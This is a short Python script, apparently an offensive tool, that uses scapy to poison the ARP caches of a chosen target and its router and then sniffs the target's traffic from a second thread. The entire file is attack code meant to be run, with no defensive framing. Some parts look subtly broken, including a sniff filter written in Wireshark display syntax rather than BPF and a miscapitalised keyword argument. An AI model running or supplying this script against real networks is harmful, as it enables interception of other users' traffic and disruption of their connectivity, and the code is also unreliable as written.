import threading
from scapy.all import ARP, send, Ether, srp, sniff, show_interfaces
import re as regex
import uuid
from getmac import get_mac_address


iface = input("iface: ")
target_ip = input("Target Ip: ")
router_ip = input("Router Ip: ")
own_mac_add = get_mac_address()


def extern_get_mac(ipadd):
    broadcast=Ether(dst="ff:ff:ff:ff:ff:ff")
    req = ARP(pdst=ipadd)
    packet = broadcast / req
    answered, unanswered = srp(packet, timeout=2, verbose=False)
    for sent, recieved in answered:
        return recieved.hwsrc

target_mac = extern_get_mac(target_ip)
router_mac = extern_get_mac(router_ip)

def spoof(target_ip, target_mac, pretend_ip, own_mac_add, iface1):
    packet=ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=pretend_ip, hwsrc=own_mac_add)
    send(packet, iface=iface1, Verbose=False)

def spoof_loop(target_ip, router_ip, target_mac, router_mac, own_mac_add):
    while True:
        #send to target "i am router"
        spoof(target_ip, target_mac, router_ip, own_mac_add, iface)
        #send to router "i am target"
        spoof(router_ip, router_mac, target_ip, own_mac_add, iface)


def sniffer(target_ip, iface1):
    filterstr="ip.addr==" + target_ip
    packets=sniff(count=0, iface=iface1, filter=filterstr, prn=lambda pkt: print(pkt.summary()), monitor=True)

sloop = threading.Thread(target=spoof_loop, args=(target_ip, router_ip, target_mac, router_mac, own_mac_add))
sniffy=threading.Thread(target=sniffer, args=(target_ip, iface))
sloop.start()
sniffy.start()